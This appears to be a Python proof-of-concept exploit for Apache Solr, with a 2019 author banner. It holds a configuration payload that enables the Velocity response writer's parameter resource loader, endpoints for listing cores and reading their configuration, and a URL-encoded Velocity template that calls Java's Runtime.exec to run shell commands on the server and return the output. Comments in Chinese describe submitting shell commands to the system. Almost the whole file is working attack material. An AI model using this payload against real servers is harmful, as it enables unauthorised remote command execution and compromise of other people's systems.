headers={
    'Proxy-Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}

change_Enable={
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}

solr_core="/solr/admin/cores?_=1573456421639&indexInfo=false&wt=json"
#获取core
solr_file="/admin/file?_=1573460142781&contentType=application%2Fjson;charset%3Dutf-8&file=configoverlay.json&wt=json"
#查看core的配置
solr_attr="params.resource.loader.enabled"
#为true是可执行shell
solr_shell="/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo iwtfky%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
#向系统提交shell命令

banner1 = '''
---------------------------------------------------------
         ______     ______     __         ______    
        /\  ___\   /\  __ \   /\ \       /\  == \   
        \ \___  \  \ \ \/\ \  \ \ \____  \ \  __<   
         \/\_____\  \ \_____\  \ \_____\  \ \_\ \_\ 
          \/_____/   \/_____/   \/_____/   \/_/ /_/ 
                                 
'''

banner2 = '''

    @author:小受
    @time:2019/11/12
    @file:solr_poc.py

---------------------------------------------------------
'''